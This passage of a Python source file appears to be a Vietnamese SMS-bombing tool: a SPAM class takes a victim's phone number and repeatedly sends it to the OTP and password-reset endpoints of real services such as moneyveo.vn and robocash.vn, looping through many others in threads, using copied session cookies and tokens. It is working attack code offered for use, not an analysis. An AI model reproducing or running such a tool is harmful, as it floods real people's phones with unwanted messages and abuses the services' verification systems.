                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'phoneNumber': ''+self.sdt[1:11],
            }

            response = requests.post(
                'https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)
            print(self.format_print("*", f"moneyveo: SUCCESS!"))
        except:
            print(self.format_print("*", f"moneyveo: ERROR!"))

    def robocash(self):
        try:
            cookies = {
                '__cfruid': 'f4d99258304c22ce750e32010702f5ba624034bf-1686147245',
                'XSRF-TOKEN': 'eyJpdiI6ImtxS1pMeU5VVFFUdldpak1lNHUwOWc9PSIsInZhbHVlIjoiUWt1dHE4NmZqN1ZkUFhBNkdHdm1sRDJBMHArbXZRUU43TzZINVA1YUU5aGFKRzlNL0lBWlVjaTVqUUNxOFpvOFNmdmVSZ3J6L2ZLNCtrWnZ2Rk43QXpxU2c1L2QvbUVkWFNUR1dXQTlBS3FKOGZPNzFweTNPTGFRWDJjZStraDMiLCJtYWMiOiIxM2U3ZDViZmU0NTIwZjVmOGI3NTRjZDg1YjM5Y2UyN2FhNzA4YzI1NTBhNzQzMjNlYTM4OWRiZGM3ZDk0MGRiIiwidGFnIjoiIn0%3D',
                'sessionid': 'eyJpdiI6ImZSQzBaQXpwWElIUXpzTHBxdWFlR3c9PSIsInZhbHVlIjoiL21pTjB0dGp6eHZEQVQrUC9MeS9rS29YVzNnWWJNbmsyOGNORXVwT09FVm1lVXRXcGlnQmhtbWRJUzhRWE5qbXFNYmg2b2ExWkc3RFZhL3dCRC81RHU1MWtBVFBHdmRRUXZOVEtWaVRCRWxDSFUyZkJRaERjVWFobThoNmphWTYiLCJtYWMiOiI2ZWMwZTAyMjgzNzg2OGQwN2ZkOTk1Y2E2MjZmMGFlYWUxOGNlZDM0OTBiNDI0MTM1ODY4MzY5MzFiZDZiNjY0IiwidGFnIjoiIn0%3D',
                'utm_uid': 'eyJpdiI6InlDVkF5OThHcTkvYXU1ZFFnYmE5UFE9PSIsInZhbHVlIjoiMjFwUWI3UzcxZzBzS3RXUDNtc3F4WDRqSUVuU1dnOEZRVkx0QnU0SUpUbHdsaTBmMWxxcG9LdHVrVURSV09mUVBndXlCbnJOVVkvbURxWCtjUWgzZnIzVzlqOGtJR1U0ZDlxekZVZkRCUW9NWGcycmxLaGN1enJjYTk5WUJNenciLCJtYWMiOiIxZmFmZThhNzMwZDVmZDIxOWZjMmVmYmMxZDdiNmRmMDdjNzYzNzhmMDJkNDEyNjVhZGY1ZGIyYjdhYTMxOGViIiwidGFnIjoiIn0%3D',
                'jslbrc': 'w.20230607141411931dd141-053d-11ee-aa28-565c7050e739.A_GS',
                'ec_png_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
                'ec_etag_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
                'ec_cache_utm': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
                'uid': 'e49a2457-41fe-fb71-cfbf-3065b8289c40',
                'ec_png_client': 'false',
                'ec_etag_client': 'false',
                'ec_cache_client': 'false',
                'client': 'false',
                'ec_png_client_utm': 'null',
                'ec_etag_client_utm': 'null',
                'ec_cache_client_utm': 'null',
                'client_utm': 'null',
                'supportOnlineTalkID': 'TDxizz9vTAMyreaD0curnTeDAnmbTLA3',
            }

            headers = {
                'authority': 'robocash.vn',
                'accept': '*/*',
                'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': '__cfruid=f4d99258304c22ce750e32010702f5ba624034bf-1686147245; XSRF-TOKEN=eyJpdiI6ImtxS1pMeU5VVFFUdldpak1lNHUwOWc9PSIsInZhbHVlIjoiUWt1dHE4NmZqN1ZkUFhBNkdHdm1sRDJBMHArbXZRUU43TzZINVA1YUU5aGFKRzlNL0lBWlVjaTVqUUNxOFpvOFNmdmVSZ3J6L2ZLNCtrWnZ2Rk43QXpxU2c1L2QvbUVkWFNUR1dXQTlBS3FKOGZPNzFweTNPTGFRWDJjZStraDMiLCJtYWMiOiIxM2U3ZDViZmU0NTIwZjVmOGI3NTRjZDg1YjM5Y2UyN2FhNzA4YzI1NTBhNzQzMjNlYTM4OWRiZGM3ZDk0MGRiIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImZSQzBaQXpwWElIUXpzTHBxdWFlR3c9PSIsInZhbHVlIjoiL21pTjB0dGp6eHZEQVQrUC9MeS9rS29YVzNnWWJNbmsyOGNORXVwT09FVm1lVXRXcGlnQmhtbWRJUzhRWE5qbXFNYmg2b2ExWkc3RFZhL3dCRC81RHU1MWtBVFBHdmRRUXZOVEtWaVRCRWxDSFUyZkJRaERjVWFobThoNmphWTYiLCJtYWMiOiI2ZWMwZTAyMjgzNzg2OGQwN2ZkOTk1Y2E2MjZmMGFlYWUxOGNlZDM0OTBiNDI0MTM1ODY4MzY5MzFiZDZiNjY0IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6InlDVkF5OThHcTkvYXU1ZFFnYmE5UFE9PSIsInZhbHVlIjoiMjFwUWI3UzcxZzBzS3RXUDNtc3F4WDRqSUVuU1dnOEZRVkx0QnU0SUpUbHdsaTBmMWxxcG9LdHVrVURSV09mUVBndXlCbnJOVVkvbURxWCtjUWgzZnIzVzlqOGtJR1U0ZDlxekZVZkRCUW9NWGcycmxLaGN1enJjYTk5WUJNenciLCJtYWMiOiIxZmFmZThhNzMwZDVmZDIxOWZjMmVmYmMxZDdiNmRmMDdjNzYzNzhmMDJkNDEyNjVhZGY1ZGIyYjdhYTMxOGViIiwidGFnIjoiIn0%3D; jslbrc=w.20230607141411931dd141-053d-11ee-aa28-565c7050e739.A_GS; ec_png_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_etag_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_cache_utm=e49a2457-41fe-fb71-cfbf-3065b8289c40; uid=e49a2457-41fe-fb71-cfbf-3065b8289c40; ec_png_client=false; ec_etag_client=false; ec_cache_client=false; client=false; ec_png_client_utm=null; ec_etag_client_utm=null; ec_cache_client_utm=null; client_utm=null; supportOnlineTalkID=TDxizz9vTAMyreaD0curnTeDAnmbTLA3',
                'origin': 'https://robocash.vn',
                'referer': 'https://robocash.vn/login',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                '_token': 'gera9vSoZkjZtK8YEPQahkJLIpvDddbFTwJ3Ud5D',
                'data': ''+self.sdt[1:11],
            }

            response = requests.post(
                'https://robocash.vn/restore/phone', cookies=cookies, headers=headers, data=data)
            print(self.format_print("*", f"robotcash: SUCCESS!"))
        except:
            print(self.format_print("*", f"robotcash: ERROR!"))

    def run_sendotp(self):
        while True:
            self.send_otp()
            time.sleep(40)

    def run_sendcode(self):
        while True:
            for x in range(3):
                self.send_code()
                time.sleep(1)
            time.sleep(50)

    def run(self):
        while True:
            self.banner()
            self.sdt = input(self.format_input(
                "!", f"NHẬP SỐ ĐIỆN THOẠI SPAM: "))
            if self.sdt != '0346720407':
                if len(self.sdt) == 10:
                    break
                print(self.format_print(
                    "!", "SỐ ĐIỆN THOẠI DƯỚI <10 SỐ XIN NHẬP LẠI !"))
            if self.sdt == '0346720407':
                print(self.format_print(
                    "!", "LÀM ƠN ĐỪNG SPAM SỐ ĐIỆN THOẠI HOANG"))
            time.sleep(3)

        threading.Thread(target=self.checkdvc).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendotp).start()
        time.sleep(1)
        threading.Thread(target=self.run_sendcode).start()
        while True:
            self.Gbay()
            self.moca()
            self.zalopay()
            self.tiki()
            self.shopee()
            self.vntrip()
            self.vayno()
            self.winmart()
            self.fptshop()
            self.est()
            self.thantaioi()
            self.caydenthan()
            self.dongplus()
            self.moneyveo()
            self.robocash()
            time.sleep(1)


if __name__ == "__main__":
    try:
        SPAM().run()
    except KeyboardInterrupt:
        time.sleep(1)
        sys.exit('\n'+SPAM().format_print('*', 'tool của HOANG:)'))